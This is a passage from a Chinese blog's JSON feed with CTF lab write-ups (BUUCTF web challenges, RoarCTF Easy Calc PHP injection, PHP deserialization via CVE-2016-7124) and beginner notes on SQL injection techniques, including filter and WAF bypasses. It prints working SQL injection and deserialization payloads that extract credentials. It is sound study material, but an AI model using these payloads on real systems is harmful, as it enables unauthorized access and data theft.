data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzYyNDIyODQyL2FydGljbGUvZGV0YWlscy8xMjQ2MTYyMDY/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjIxNjY0MjU4MTY1MTY4MDAxODY1MTAwNTMlMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQuLiUyNTIyJTI1N0QmYW1wO3JlcXVlc3RfaWQ9MTY2NDI1ODE2NTE2ODAwMTg2NTEwMDUzJmFtcDtiaXpfaWQ9MCZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3NlYXJjaF9yZXN1bHQubm9uZS10YXNrLWJsb2ctMn5hbGx+dG9wX3Bvc2l0aXZlfmRlZmF1bHQtMS0xMjQ2MTYyMDYtbnVsbC1udWxsLjE0MiU1RXY1MCU1RWNvbnRyb2wsMjAxJTVFdjMlNUVjb250cm9sXzEmYW1wO3V0bV90ZXJtPSU1QkdYWUNURjIwMTklNURQaW5nJTIwUGluZyUyMFBpbmcmYW1wO3NwbT0xMDE4LjIyMjYuMzAwMS40MTg3\">Linux 绕过</span>，</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzYyNDIyODQyL2FydGljbGUvZGV0YWlscy8xMjQ2MTYyMDY=\">详解</span></p>\n<h3 id=\"11secret-file\"><a class=\"anchor\" href=\"#11secret-file\">#</a> 11.Secret File</h3>\n<p>找文件，抓包，看源码，找提示。</p>\n<p>伪协议读取 flag.php</p>\n<h3 id=\"12lovesql\"><a class=\"anchor\" href=\"#12lovesql\">#</a> 12.LoveSQL</h3>\n<p>试试，直接注，找到提示表，查询到 flag。</p>\n<h3 id=\"13http\"><a class=\"anchor\" href=\"#13http\">#</a> 13.HTTP</h3>\n<p>打开靶场，查看源码。</p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/aaahtp.jpg\" alt=\"http_1\" /></p>\n<p>进入 secret.php 发现如下</p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/ahttp_1.jpg\" alt=\"ahttp_1\" /></p>\n<p>此处是一个对报文来源的要求，用 burp 抓包，<strong>修改来源，发现没有 Referer，手动添加到 upgrade 上，或 cookie 上，内容 <code>Referer: https://Sycsecret.buuoj.cn</code> </strong></p>\n<p>再发送。得到 Response，要求用 &quot;Syclover&quot; 浏览器，<strong>在 User-Agent 中修改，Firefox 为 Syclover。</strong></p>\n<p>再发送。得到 Response，<strong>&quot;Read this locally!&quot;</strong>，在 upgrade 上加一行 ** <code>X-Forwarded-For: 127.0.0.1</code> .**</p>\n<p>再发送。就再 Responce 中得到 flag.</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token request-line\"><span class=\"token method property\">GET</span> <span class=\"token request-target url\">/Secret.php</span> <span class=\"token http-version property\">HTTP/1.1</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">node3.buuoj.cn:29399</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">\"Syclover\" browser         #伪造客户端浏览器</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">close</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Referer</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">https://www.Sycsecret.com     #伪造</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">X-Forwarded-for</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">127.0.0.1             #伪造源地址</span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span></pre></td></tr></table></figure><h3 id=\"14buyctfbabysql2019\"><a class=\"anchor\" href=\"#14buyctfbabysql2019\">#</a> 14.BUYCTF[BabySql2019]</h3>\n<p>查询源代码，是 get 请求。</p>\n<p>尝试登录，在输入 <code>1'</code>  时<strong>报错</strong>，得知是<strong>单引号闭合</strong>。</p>\n<p><strong>选择通过密码进行注入</strong>。</p>\n<p>输入  <code>1' or 1=1 -- '</code>  报错，发现报错语句中没有 <code>or</code> ，应该是<strong>过滤</strong>了。</p>\n<p>尝试:</p>\n<pre><code>1. 双写`oror`\n2. 隐写`oorr`\n</code></pre>\n<p>发现 2 是可行的，1 会报错，没有 <code>or</code>  出现。这里明白是一个 ' 强' 过滤。(<strong>即只要有 <code>or</code>  字节出现在语法中就会过滤</strong>，如 <code>inform,password</code> )</p>\n<p>用 <code>1' oorr 1=1 -- '</code>  成功登入，发现有<img data-src=\"https://evefortosaber.github.io/Open-pictures/babysql.jpg\" alt=\"babysql\" /></p>\n<p>之后用 <code>union select</code>  通过报错，发现<strong> union，select 都被过滤</strong>。</p>\n<p>用 <code>uniunionon selselectect 1,1,1</code>  查出列名，和对应显示。</p>\n<p><em><strong>palyload</strong></em> 如下：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token string\">' uniunionon selselectect 1,database(),3 -- '</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// geek</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">1</span><span class=\"token string\">' uniunionon selselectect 1,(selselectect group_concat(table_name)frfromom infoorrmation_schema.tables whewherere table_schema='</span>geek<span class=\"token string\">'),3 -- '</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// b4bsql</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">1</span><span class=\"token string\">' uniunionon selselectect 1,(selselectect group_concat(column_name)frfromom infoorrmation_schema.columns whewherere table_schema='</span>geek<span class=\"token string\">' anandd table_name='</span>b4bsql<span class=\"token string\">'),3 -- '</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// id username password</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">1</span><span class=\"token string\">' uniunionon selselectect 1,2,(selselectect group_concat(concat(id,'</span> <span class=\"token string\">',username,'</span> <span class=\"token string\">',passwoorrd))frfromom geek.b4bsql) -- '</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// 8 flag flag&#123;11939082-38b7-412d-830a-cbe89b508804&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">/* 123'  uniunionon selselectect 1,(selselectect group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql' anandd table_schema='geek'),(selselectect group_concat(concat(username,' ',passwoorrd,' ',id)) frfromom geek.b4bsql) -- ' */</span></pre></td></tr></table></figure><blockquote>\n<p>这里发现一个<strong>问题</strong>，使用</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token string\">' uniunionon selselectect 1,2,(selselectect concat(id,'</span> <span class=\"token string\">',username,'</span> <span class=\"token string\">',passwoorrd)frfromom geek.b4bsql) -- '</span></pre></td></tr></table></figure><p>&lt;u&gt; 报错 ' more than one row ' 但使用 group_concat 无报错。&lt;/u&gt;</p>\n<p>&lt;u&gt;concat () 返回将相应字段连接成字符串的一列值。&lt;/u&gt;</p>\n<p>&lt;u&gt;group_concat () 返回的是一串字符串。&lt;/u&gt;</p>\n</blockquote>\n<h3 id=\"15roarctf-2019easy-calc\"><a class=\"anchor\" href=\"#15roarctf-2019easy-calc\">#</a> 15.[RoarCTF 2019]Easy Calc</h3>\n<p>计算器。显然不是数据库。不用 SQL 注入。</p>\n<p>输入 <code>1+1 / 1 /' / 1' / &quot; </code> 根据报错情况，没啥用。看源码。找到 calc.php.</p>\n<p>可以传参 num, 传一下试试。有 waf,php 和 waf 的变量判断方式不一样.</p>\n<p>用 php 代码注入.</p>\n<p>所以传 <code>?%20?num=1</code></p>\n<p>传入并执行了，根据它的过滤规则，堆叠注入.</p>\n<p><code>?%20num=1;var_dump(scandir(chr(47)))</code> (chr (47) 是 '/') 访问根目录，并打印.</p>\n<p>找到 flagg.</p>\n<p><code>?&amp;20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>\n<h3 id=\"16极客大挑战-2019php\"><a class=\"anchor\" href=\"#16极客大挑战-2019php\">#</a> 16.[极客大挑战 2019] PHP</h3>\n<p>进入题目根据提示：</p>\n<blockquote>\n<p>因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯</p>\n</blockquote>\n<p>对网站备份扫描 *&quot;&quot;E:\\burpsuite\\ 备份扫描.py&quot;&quot;* 使用 Python 脚本.</p>\n<p>得到 www.zip</p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/1_16_01.png\" alt=\"01\" /></p>\n<p>查看三个 PHP 文件.</p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/1_16_02.jpg\" alt=\"02\" /></p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/1_16_03.jpg\" alt=\"03\" /></p>\n<p>跟据代码，思路大致为</p>\n<blockquote>\n<p>利用 get 方法传参 select，select 要序列化。</p>\n<p>select 的内容是建立一个对象 Name，username=admin，password=100.</p>\n<p>要绕过 wakeup () . //<em> 调用 unserialize () 时会自动调用魔法函数 wakeup ()</em></p>\n</blockquote>\n<p>构造语法 (<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmVqc29uLmNvbS9ydW5jb2RlL3BocC8=\">PHP 执行</span>)</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Name</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"yesyesyes\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"nonono\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token this keyword\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">=</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token this keyword\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Name</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 输出序列化</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">// O:4:\"Name\":2:&#123;s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;&#125;</span></span></pre></td></tr></table></figure><p>URL 不能识别 <code>&quot;</code> ，同时， <code>&quot;Nameusername&quot;</code>  应为 <code>&quot;%00Name%00username&quot;</code></p>\n<blockquote>\n<p>因为成员（属性）是 private，所以要在类名和成员名前加 <code>%00</code>  这个 url 编码是空的意思</p>\n<p>序列化时生成的序列化字符串中类名前后本来就会有 0×00 也就是空</p>\n</blockquote>\n<p>再利用 CVE-2016-7124 反序列化漏洞，属性数大于属性个数时，会跳过__wakeup () 魔术函数。</p>\n<p>最终 payload 为</p>\n<figure class=\"highlight url\"><figcaption data-lang=\"url\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token path\"><span class=\"token path-separator\">/</span></span><span class=\"token query\"><span class=\"token query-delimiter\">?</span><span class=\"token pair\"><span class=\"token key\">select</span>=</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token path\">O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</span></pre></td></tr></table></figure><p>解释一下这里利用了 <code>echo urlencode($b)</code>  直接将其 URLencode，再将属性数改大。</p>\n<h3 id=\"17buyflag\"><a class=\"anchor\" href=\"#17buyflag\">#</a> 17.BUYFlag</h3>\n<p>查看 pay.php 的源码</p>\n<p>发现是 post，抓包构造 payload。</p>\n<p>修改 cookie，user=1 (猜测)</p>\n<p>money=1000000000&amp;password=404a (PHP 的弱等于)</p>\n<p>回显数字太长，用科学计数法 1e9.</p>\n<p>得到 flag</p>\n<h2 id=\"二-crypto\"><a class=\"anchor\" href=\"#二-crypto\">#</a> 二、CRYPTO</h2>\n<p>摩丝密码的英文只有大写</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>摩斯电码只有大写，将它改成大写就行啦</pre></td></tr></table></figure><p>1.URL</p>\n<p>2.base-16，base-32，base-64</p>\n<p>3.md5</p>\n<p>4.ROT13 旋转加密</p>\n<h3 id=\"1password\"><a class=\"anchor\" href=\"#1password\">#</a> 1.PASSWORD</h3>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/image-20220930164451487.png\" alt=\"image-20220930164451487\" /></p>\n<p>就是猜。。。</p>\n<p zs19900315=\"\">flag</p>\n<blockquote>\n<p>私钥 d 攻击</p>\n<p>Coppersmith 相关攻击</p>\n<p>ECC</p>\n</blockquote>\n<h3 id=\"2变异凯撒\"><a class=\"anchor\" href=\"#2变异凯撒\">#</a> 2. 变异凯撒</h3>\n<p Caesar_variation=\"\">flag</p>\n<p><em>凯撒加密，即将原私钥通过 ASCII 移位的方式加密。</em></p>\n<p>得到密文。可能每处移位的不一样。</p>\n<p>这里是<img data-src=\"https://evefortosaber.github.io/Open-pictures/image-20220930170155624.png\" alt=\"image-20220930170155624\" /></p>\n<p><strong>afZ_r9VYfScOeO_UL^RWUc</strong></p>\n<p>根据格式，对前 5 位，按照 ASCII 表解密为<strong> flag {</strong>，从而推出加密规律。</p>\n<p>udf 提权，mof 提权</p>\n<p>宽字节注入限制</p>\n<p>什么时候用，</p>\n<p>怎么用，用在哪，</p>\n<p>为什么要用。</p>\n",
            "tags": [
                "CTF"
            ]
        },
        {
            "id": "http://example.com/2023/03/19/WebSecurity/CTF/%E5%AD%A6%E4%B9%A0SQL/",
            "url": "http://example.com/2023/03/19/WebSecurity/CTF/%E5%AD%A6%E4%B9%A0SQL/",
            "title": "SQL注入",
            "date_published": "2023-03-19T11:29:17.421Z",
            "content_html": "<p>作为刚入门时，初步接触 SQL 所作的笔记</p>\n<hr />\n<h1 id=\"sql注入\"><a class=\"anchor\" href=\"#sql注入\">#</a> SQL 注入</h1>\n<h2 id=\"1postget注入\"><a class=\"anchor\" href=\"#1postget注入\">#</a> 1.post&amp;get 注入</h2>\n<p>修改 username 等信息进行无账号登录或构造语句查询敏感数据。</p>\n<p>常用 <code>'</code> ， <code>&quot;</code> ， <code>')</code> ， <code>&quot;)</code>  与 “and 1=1；and1=2” 与  <code>-- '</code>  进行试探～～(可能有双括号)~~</p>\n<p>目的：判断是字符还是整形</p>\n<p>之后用 order by 或 union select 判断段数</p>\n<p>再子查询</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">union</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">-- 语句联合查询</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>schema_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span>schemata<span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">-- 查库</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span><span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">'db'</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">-- 查表</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">)</span><span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">where</span> table_name<span class=\"token operator\">=</span><span class=\"token string\">'T'</span> <span class=\"token operator\">and</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">'db'</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">-- 查字段</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>concat<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">,</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span>id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> security<span class=\"token punctuation\">.</span>users<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">-- 查字段内容</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> concat<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">,</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span>id<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> security<span class=\"token punctuation\">.</span>users <span class=\"token keyword\">limit</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">-- 当显示长度有限制时</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">--</span></pre></td></tr></table></figure><h2 id=\"2extractvalue-报错注入\"><a class=\"anchor\" href=\"#2extractvalue-报错注入\">#</a> 2.extractvalue 报错注入</h2>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>extractvaule 报错注入</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">and</span> extractvalue<span class=\"token punctuation\">(</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">-- '</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">-- 查数据库</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">and</span> extractvalue<span class=\"token punctuation\">(</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">-- '</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">-- 查库的表</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">and</span> extractvalue<span class=\"token punctuation\">(</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">''</span> <span class=\"token operator\">and</span> table_name<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">-- '</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">-- 查表的字段</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">and</span> extractvalue<span class=\"token punctuation\">(</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">,</span><span class=\"token string\">','</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> db<span class=\"token punctuation\">.</span><span class=\"token keyword\">table</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">-- '</span></pre></td></tr></table></figure><p><code>extractvalue(content,path)</code>  这里利用了 <code>path</code>  错误报错获取信息，利用了 <code>concat</code>  与 <code>select</code>  的嵌套</p>\n<p>从而使报错内容 <code>concat</code>  得以显示。<strong>也就是说错误的是 <code>concat(slect)</code>  报错时报 <code>concat</code>  的错但会回显，从而显示 <code>select</code>  的内容</strong>，达到获取信息的目的。</p>\n<h2 id=\"3绕warf\"><a class=\"anchor\" href=\"#3绕warf\">#</a> 3. 绕 warf</h2>\n<p>/**/ 替空格，unionunion 类似绕关键字屏蔽，selselectect 包括。</p>\n<p>base-64，MD5 () 解码。</p>\n<h2 id=\"4编码\"><a class=\"anchor\" href=\"#4编码\">#</a> 4. 编码</h2>\n<p>%23 -- #   URL 编码</p>\n<h2 id=\"5盲注\"><a class=\"anchor\" href=\"#5盲注\">#</a> 5. 盲注</h2>\n<p>使用 Python 脚本</p>\n<h2 id=\"6堆叠注入\"><a class=\"anchor\" href=\"#6堆叠注入\">#</a> 6. 堆叠注入</h2>\n<p>堆叠注入原理</p>\n<p>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询<br />\n原理很简单，mysql_multi_query () 支持多条 sql 语句同时执行，就是个；分隔，成堆的执行 sql 语句，例如</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users<span class=\"token punctuation\">;</span><span class=\"token keyword\">show</span> <span class=\"token keyword\">databases</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>就同时执行以上两条命令，所以我们可以增删改查，只要权限够<br />\n虽然这个注入姿势很牛逼，但实际遇到很少，其可能受到 API 或者数据库引擎，又或者权限的限制<em><strong>只有当调用数据库函数支持执行多条 sql 语句时才能够使用</strong></em>，利用 mysqli_multi_query () 函数就支持多条 sql 语句同时执行，&lt;u&gt; 但实际情况中，如 PHP 为了防止 sql 注入机制，往往使用调用数据库的函数是 mysqli_ query () 函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限 &lt;/u&gt;，一旦能够被使用，将可能对网站造成十分大的威胁。</p>\n<blockquote>\n<p>原文链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NjkxMjk0L2FydGljbGUvZGV0YWlscy8xMDczNzYyODQ=\">https://blog.csdn.net/qq_45691294/article/details/107376284</span></p>\n</blockquote>\n<h2 id=\"7绕过select注入\"><a class=\"anchor\" href=\"#7绕过select注入\">#</a> 7. 绕过 select 注入</h2>\n<p>使用 handler 语法。</p>\n",
            "tags": [
                "CTF"
            ]
        },
        {
            "id": "http://example.com/2023/03/19/Mathematics/%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0%E4%B8%80/",
            "url": "http://example.com/2023/03/19/Mathematics/%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0%E4%B8%80/",
            "title": "高等数学笔记一",
            "date_published": "2023-03-19T11:29:17.406Z",
